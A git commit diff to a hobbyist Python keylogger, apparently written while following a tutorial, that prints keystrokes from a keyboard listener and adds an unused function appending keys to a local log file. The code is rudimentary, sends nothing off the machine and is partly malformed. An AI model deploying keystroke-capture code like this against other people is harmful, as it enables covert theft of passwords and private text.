33f2dae1012d2cd4675ec44e954a2b3a9ceca659
joey101 <jawad.tanana@gmail.com>
2021-05-27 21:02:38 +1000

    key logging following tut

--- keylogger/log.py
+++ keylogger/log.py
@@ -10,31 +10,17 @@ from datetime import datetime as t
 # Listens to the key inputs from the keyboard
 def on_press(key):
     try:
-        print('alphanumeric key {0} pressed'.format(key.char))
+        print('{0}'.format(key))
     except AttributeError:
         print('special key {0} pressed'.format(key))
 #%-----------------------------------------------------------------------------
 # Marks down keys once released
 def on_release(key):
-    print('{0} released'.format(key))
     if key == keyboard.Key.esc:
         # Stop listener
         return False
-
-#%-----------------------------------------------------------------------------  
-# Collect events until released
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
 #%-----------------------------------------------------------------------------
-# ...or, in a non-blocking fashion:
-listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-listener.start()
-#%-----------------------------------------------------------------------------
-"""    
-# For Linux Directory
-with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as logging:
-# For Windows Directory
-#with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as logging:
+def get_time():
     # This gets the date and time in 
     # dd/mm/yyyy and HH:MM:SS
     now = t.now()
@@ -43,8 +29,26 @@ with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as logging
     time_only = t.now()
     current_t = now.strftime("[%H:%M:%S]: ")
     
-    # This appends to a file.
-    logging.write(current_dt)
-    logging.write("First line contains")
-    logging.write("\n")
-"""
+#%-----------------------------------------------------------------------------
+def write_file(key):
+    # For Linux Directory
+    with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as \\
+            logging:
+    # For Windows Directory
+    #with open("E:\OneDrive - UNSW\Coding\python\keylogger\log.txt",'a') as \\
+            #logging:
+               # This appends to a file.
+        for keys in key:
+            logging.write(keys)
+
+#%-----------------------------------------------------------------------------  
+# Collect events until released
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+#%-----------------------------------------------------------------------------
+# ...or, in a non-blocking fashion:
+#listener = keyboard.Listener(on_press=on_press,on_release=on_release)
+#listener.start()
+#%-----------------------------------------------------------------------------
+
+
